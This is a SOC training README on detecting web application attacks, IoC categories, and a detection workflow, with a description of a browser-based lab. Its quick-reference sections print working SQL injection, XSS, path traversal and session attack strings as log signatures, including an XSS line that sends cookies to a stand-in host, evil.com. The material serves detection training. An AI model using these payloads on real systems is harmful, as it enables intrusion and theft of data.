# Day 05 — Application-Level Attacks, IoC Detection, and Web Security

Covers every major web application attack category, how a SOC analyst detects each one in logs, what Indicators of Compromise look like, and the full IoC detection methodology.

---

## What This Covers

- SQL Injection: mechanics, detection signatures, IoC patterns in WAF/IDS/DB logs
- Cross-Site Scripting (XSS): reflected, stored, DOM-based; obfuscation bypass techniques
- Parameter Tampering: URL, cookie, hidden field, and HTTP header manipulation
- Directory Traversal: path traversal patterns and IoC signatures
- CSRF: session riding mechanics and defense (CSRF tokens, SameSite)
- Cookie Poisoning and Session Fixation: session attack mechanics and defenses
- Application-level DoS: user registration DoS, login overload, account lockout abuse
- Host-level threats: malware entry vectors (email, unpatched systems, social engineering)
- IoCs: atomic vs computed vs behavioral — why they matter and how to use them
- IoC detection techniques: network monitoring, packet analysis, log analysis, host analysis
- Detection for each attack in WAF logs, web server logs, IDS alerts, and database logs

---

## Attack Detection Quick Reference

### SQL Injection Log Signatures

```
GET /login.php?id=1' OR '1'='1--                     → SQL tautology
GET /user?id=1 UNION SELECT null,username,password--  → UNION extraction
GET /api?q=1; WAITFOR DELAY '0:0:5'--                 → Time-based blind
GET /admin?id=1; exec xp_cmdshell('whoami')--         → RCE via SQLi
```

WAF detection: look for `'`, `--`, `UNION`, `SELECT`, `exec`, `xp_` in URL parameters and POST bodies.

### XSS Log Signatures

```
GET /search?q=<script>alert(document.cookie)</script>         → Reflected XSS
GET /page?bio=<img src=x onerror=fetch('//evil.com?c='+...)>  → DOM XSS via attribute
GET /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E         → Hex encoded XSS
GET /page?q=<sCRipT>alert(1)</ScRiPt>                         → Toggle case evasion
```

WAF detection: `<script`, `onerror=`, `onload=`, `javascript:`, `document.cookie` in any user-supplied input.

### Directory Traversal Signatures

```
GET /file?path=../../../../etc/passwd               → Linux filesystem
GET /download?doc=..\..\..\..\windows\win.ini       → Windows filesystem
GET /view?name=%2e%2e%2f%2e%2e%2fetc%2fpasswd       → URL encoded
GET /get?f=%252e%252e%252fetc%252fpasswd            → Double encoded
```

WAF detection: `../`, `..\`, `%2e%2e`, `etc/passwd`, `win.ini` in path parameters.

### CSRF Detection Patterns

```
POST /transfer Referer: https://evil-site.com   → External Referer
POST /settings Cookie: valid_session            → Missing CSRF token
GET /admin/delete?id=5 from malicious page      → Forced GET action
```

### Session Attack Indicators

```
SESSIONID=ATTACKER_PRESET_VALUE in URL parameter     → Session fixation attempt
Cookie: TotalPrice=1;admin=true                       → Cookie poisoning
Multiple logins from different IPs with same session  → Session hijacking
```

---

## IoC Categories

**Atomic IoCs** — cannot be broken into smaller meaningful parts.
Examples: IP address, email address, domain name, file hash.

**Computed IoCs** — derived from analysis of security incident data.
Examples: MD5/SHA256 file hash, regex pattern matching attack signatures.

**Behavioral IoCs** — groupings of atomic and computed indicators based on logic.
Examples: "host making outbound connections to known C2 IPs while running encoded PowerShell" — no single indicator tells the story, the combination does.

---

## IoC Detection Workflow

```
1. COLLECT      — aggregate logs from WAF, IDS, web server, DB, endpoint
2. EXTRACT      — parse for known IoC patterns (IPs, domains, signatures)
3. ENRICH       — cross-reference against threat intelligence feeds
4. CORRELATE    — link IoCs across time and sources
5. INVESTIGATE  — determine scope, impact, root cause
6. RESPOND      — block, contain, remediate
7. DOCUMENT     — update detection rules with new IoCs
```

---

## Lab

Open `lab/webapp_security_lab.html` in any browser. No install required.

**Four tabs:**

**Tab 1 — WAF Log Analyzer:** Live stream of simulated WAF requests including SQL injection, XSS, path traversal, CSRF, and clean traffic. Click any log entry for full request details, payload analysis, IoC extraction, and mitigation guidance.

**Tab 2 — Attack Payload Tester:** 6 attack categories with real-world payloads (SQLi, XSS, Path Traversal, Parameter Tampering, CSRF, Session Attacks). Select any payload to analyze its technique, WAF evasion risk, MITRE ATT&CK mapping, and detection signatures. Simulate attacks against a target URL.

**Tab 3 — IoC Hunt Console:** Paste any raw log, HTTP request, or network capture. The engine extracts all IoCs (IPs, URLs, domains, emails, hashes, SQL signatures, XSS patterns, path traversal patterns) and classifies each as MALICIOUS/SUSPICIOUS/CLEAN using embedded threat intelligence.

**Tab 4 — Session Attack Simulator:** Step-by-step visual simulation of Cookie Poisoning, Session Fixation, CSRF, SQL Injection Auth Bypass, and Stored XSS. Each step shows the actual HTTP request/response or code, with the attack steps highlighted in red and defenses in green.

---

## References

See docs/references.md
